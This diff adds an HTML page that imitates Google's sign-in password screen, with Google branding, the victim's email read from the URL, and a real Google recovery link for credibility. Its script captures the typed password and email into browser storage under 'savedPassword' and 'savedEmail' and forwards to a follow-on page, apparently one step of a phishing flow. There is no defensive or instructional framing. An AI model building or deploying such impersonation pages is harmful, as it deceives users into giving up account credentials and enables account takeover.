@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Login</title>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', sans-serif;
+      background-color: #ecf2f7;
+    }
+
+    .login-container {  
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100%;
+    }
+
+    .login-box {
+      border-radius: 25px;
+      background-color: white;
+      padding: 30px;
+      width: 980px;
+      max-width: 95%;
+      box-sizing: border-box;
+      height: 350px;
+      flex-direction: row;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+    }
+
+    .img-logo{
+      height: 43px;
+      width: 43px;
+      margin-bottom: 0px;
+      margin-top: 0px;
+      margin-left: 15px;
+    }
+
+    h2 {
+      font-size: 35px;
+      color: #333;
+      text-align: left;
+      display: flex;
+      flex-direction: row;
+      width: 200px;
+      padding-top: 0px;
+      padding-bottom: 0px;
+      margin-top: 21px;
+      margin-bottom: 0px;
+      margin-left: 10px;
+      font-weight: 500;
+    }
+
+    #emailDisplay{
+      margin-top: 15px;
+      margin-left: 8px;
+      font-size: 16px;
+      border-radius: 20px;
+      width: 300px;
+    }
+
+    
+    .left-side{
+      width:250px;
+      height:auto;
+    }
+
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      width: 450px;
+      float: right;
+      margin-top: 70px;
+    }
+
+    .input-group {
+      margin-top: 0px;
+      margin-bottom: 0px;
+      width: 400px;
+    }
+
+    fieldset {
+      border: solid #2f2c2c 1px;
+      border-radius: 5px;
+      background-color: #ffffff;
+      padding: 0;
+    }
+
+    legend {
+      font-size: 13px;
+      color: #555;
+      padding: 0 5px;
+    }
+
+    input[type="password"] {
+  width: 100%;
+  height: 40px;
+  padding: 0 10px;
+  border: none;
+  background-color: white;
+  font-size: 16px;
+  box-sizing: border-box;
+}
+
+input[type="password"]:focus {
+  outline: none;
+}
+
+input[type="password"]:-webkit-autofill {
+  background-color: white !important;
+  -webkit-box-shadow: 0 0 0px 1000px white inset !important;
+  box-shadow: 0 0 0px 1000px white inset !important;
+  -webkit-text-fill-color: #000 !important;
+  transition: background-color 9999s ease-in-out 0s;
+}
+
+
+    
+
+    a:link{
+      text-decoration: none;
+      font-size: 14px;
+    } 
+    
+    a:hover{
+      text-decoration: none !important;
+    } 
+
+   
+
+    
+    .guest-text-box{
+      margin-right: 5px;
+      margin-top: 40px;
+      margin-bottom: 20px;
+    }
+
+    .p-Guest-para{
+      font-size: 14px;
+    }
+    
+    .lower-button{
+      display: flex;
+      flex-direction: row;
+    }
+
+    .create-account{
+      margin-top: 9px;
+      margin-right: 40px;
+      color: rgb(5, 104, 198);
+      font-weight: 600;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .next-button {
+      background-color: rgb(5, 104, 198);
+      color: white;
+      font-size: 14px;
+      font-weight: lighter;
+      border: none;
+      border-radius: 5px;
+      padding: 10px 20px;
+      cursor: pointer;
+      border-radius: 40px;
+      width: 85px;
+    }
+
+    .next-button:hover {
+      background-color: rgb(3, 80, 150);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <div class="left-side">
+        <div class="img-logo">
+          <img src="Google.jpeg"/>
+            </div>
+              <h2>Welcome</h2>
+              <label for="fruit"></label>
+              <select name="fruit" id="emailDisplay">
+                <option>Loading...</option>
+              </select>
+              <span id="widthCalc" style="position: absolute; visibility: hidden;"></span>
+            </div>
+            
+          <form action="#" method="POST">
+            <div class="input-group">
+              <fieldset>
+                <legend for="password">Enter your password</legend>
+                <input type="password" id="password" name="password" required />
+              </fieldset>
+            </div>
+
+            <div style="margin-top: 8px; margin-right: 250px;">
+              <input type="checkbox" id="showPassword">
+              <label for="showPassword">Show Password</label>
+            </div>
+            <div class="guest-text-box">
+              <p class="p-Guest-para">&#x200B</p>
+            </div>
+            <div class="lower-button">
+            <a class="create-account" href="https://myaccount.google.com/signinoptions/password">Forgot password?</a>
+            <button type="button" class="next-button" onclick="savePassword()">Next</button>
+          </div>
+          </form>
+      </div>
+  </div>
+
+
+  <script>
+    window.onload = function () {
+      const email = new URLSearchParams(window.location.search).get('email');
+      const dropdown = document.getElementById('emailDisplay');
+      const option = dropdown.options[0];
+      const widthCalc = document.getElementById('widthCalc');
+  
+      if (email) {
+        option.text = email;
+        widthCalc.innerText = email;
+  
+        const padding = 40;
+        const calculatedWidth = widthCalc.offsetWidth + padding;
+        dropdown.style.width = calculatedWidth + "px";
+      } else {
+        option.text = "No email provided";
+      }
+    };
+    function savePassword() {
+      const password = document.getElementById("password").value;
+  const email = new URLSearchParams(window.location.search).get('email');
+
+  localStorage.setItem("savedPassword", password);
+  localStorage.setItem("savedEmail", email);
+
+  window.location.href = "last.html";
+  }
+
+  document.getElementById("showPassword").addEventListener("change", function () {
+    const passwordInput = document.getElementById("password");
+    passwordInput.type = this.checked ? "text" : "password";
+  });
+  </script>
+  
+  
+
+</body>
+</html>
